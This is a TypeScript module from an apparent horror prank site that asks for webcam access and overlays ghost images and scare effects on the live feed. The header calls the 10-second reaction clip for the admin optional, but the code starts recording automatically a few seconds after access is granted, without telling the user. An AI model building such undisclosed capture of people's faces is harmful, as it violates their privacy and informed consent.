/** Ask for webcam → ghost overlay + optional 10s reaction clip for admin. */

import { play, jumpscare, CUSTOM_SFX, playSnippet } from './audio/haunt'
import { captureWebcamReaction } from './reaction'
import { bootFaces, bootScarePool, bootSfx } from './boot'

let stream: MediaStream | null = null
let raf = 0
let reactionStarted = false

export function closeWebcam() {
  if (raf) cancelAnimationFrame(raf)
  raf = 0
  stream?.getTracks().forEach((t) => t.stop())
  stream = null
  reactionStarted = false
  document.querySelectorAll('.webcam-possess').forEach((el) => el.remove())
  document.querySelectorAll('.webcam-ask').forEach((el) => el.remove())
}

export async function askWebcamPossession(): Promise<boolean> {
  closeWebcam()
  const overlay = document.createElement('div')
  overlay.className = 'webcam-ask'
  const box = document.createElement('div')
  box.className = 'webcam-ask-box'
  const title = document.createElement('p')
  title.className = 'gothic'
  title.textContent = 'Can I see you?'
  const row = document.createElement('div')
  row.className = 'ask-row'
  const yes = document.createElement('button')
  yes.type = 'button'
  yes.textContent = 'Yes'
  const no = document.createElement('button')
  no.type = 'button'
  no.textContent = 'No'
  row.append(yes, no)
  box.append(title, row)
  overlay.appendChild(box)
  document.body.appendChild(overlay)

  return new Promise((resolve) => {
    no.addEventListener('click', () => {
      overlay.remove()
      void play(bootSfx('laugh') || CUSTOM_SFX.laugh, 0.35)
      resolve(false)
    })
    yes.addEventListener('click', async () => {
      overlay.remove()
      const ok = await startPossession()
      resolve(ok)
    })
  })
}

async function startPossession(): Promise<boolean> {
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
      audio: false,
    })
  } catch {
    void play(bootSfx('glitch'), 0.3)
    setTimeout(() => jumpscare(), 600)
    return false
  }

  void play(bootSfx('static'), 0.25)
  const wrap = document.createElement('div')
  wrap.className = 'webcam-possess'
  const frame = document.createElement('div')
  frame.className = 'cam-frame'
  const video = document.createElement('video')
  video.playsInline = true
  video.muted = true
  video.autoplay = true
  const canvas = document.createElement('canvas')
  const chrome = document.createElement('div')
  chrome.className = 'cam-chrome'
  const live = document.createElement('span')
  live.className = 'blink'
  live.textContent = '● LIVE — YOUR ROOM'
  const closeBtn = document.createElement('span')
  closeBtn.style.cursor = 'pointer'
  closeBtn.textContent = '[x]'
  chrome.append(live, closeBtn)
  const msg = document.createElement('div')
  msg.className = 'cam-msg'
  msg.textContent = 'do not look behind you'
  frame.append(video, canvas, chrome, msg)
  wrap.appendChild(frame)
  document.body.appendChild(wrap)

  const ctx = canvas.getContext('2d', { alpha: false })!
  video.srcObject = stream
  await video.play().catch(() => {})

  const ghosts = [...bootFaces(), ...bootScarePool()]
  const ghostImg = new Image()
  ghostImg.decoding = 'async'
  if (ghosts.length) ghostImg.src = ghosts[Math.floor(Math.random() * ghosts.length)]

  let t0 = performance.now()
  let nextFlash = t0 + 4500
  let flashUntil = 0

  const draw = (now: number) => {
    if (!stream) return
    const w = video.videoWidth || 640
    const h = video.videoHeight || 480
    if (canvas.width !== w) {
      canvas.width = w
      canvas.height = h
    }
    ctx.save()
    ctx.scale(-1, 1)
    ctx.drawImage(video, -w, 0, w, h)
    ctx.restore()

    ctx.fillStyle = 'rgba(80,0,0,0.18)'
    ctx.fillRect(0, 0, w, h)
    for (let y = 0; y < h; y += 3) {
      ctx.fillStyle = 'rgba(0,0,0,0.15)'
      ctx.fillRect(0, y, w, 1)
    }

    if (ghostImg.complete && ghostImg.naturalWidth) {
      const pulse = 0.25 + Math.sin((now - t0) / 400) * 0.15
      ctx.globalAlpha = pulse
      const gw = w * 0.45
      const gh = h * 0.7
      ctx.drawImage(ghostImg, w * 0.55, h * 0.2, gw, gh)
      ctx.globalAlpha = pulse * 0.5
      ctx.drawImage(ghostImg, -gw * 0.2, h * 0.15, gw, gh)
      ctx.globalAlpha = 1
    }

    if (now >= nextFlash) {
      flashUntil = now + 380
      nextFlash = now + 7000 + Math.random() * 5000
      void play(bootSfx('scare'), 0.55)
      msg.textContent = 'IT IS IN THE ROOM'
      setTimeout(() => {
        if (stream) msg.textContent = 'do not look behind you'
      }, 900)
    }
    if (now < flashUntil) {
      ctx.globalAlpha = 0.85
      ctx.drawImage(ghostImg, 0, 0, w, h)
      ctx.globalAlpha = 1
    }

    raf = requestAnimationFrame(draw)
  }
  raf = requestAnimationFrame(draw)

  closeBtn.addEventListener('click', () => {
    closeWebcam()
    void play(bootSfx('dying'), 0.3)
    setTimeout(() => jumpscare({ brutality: 0.85, force: true }), 400)
  })

  setTimeout(() => {
    if (stream) void playSnippet(CUSTOM_SFX.ghost, 0.35, 2.5)
  }, 5000)

  if (!reactionStarted) {
    reactionStarted = true
    setTimeout(() => {
      if (stream) void captureWebcamReaction(stream, 'webcam')
    }, 3500)
  }

  return true
}
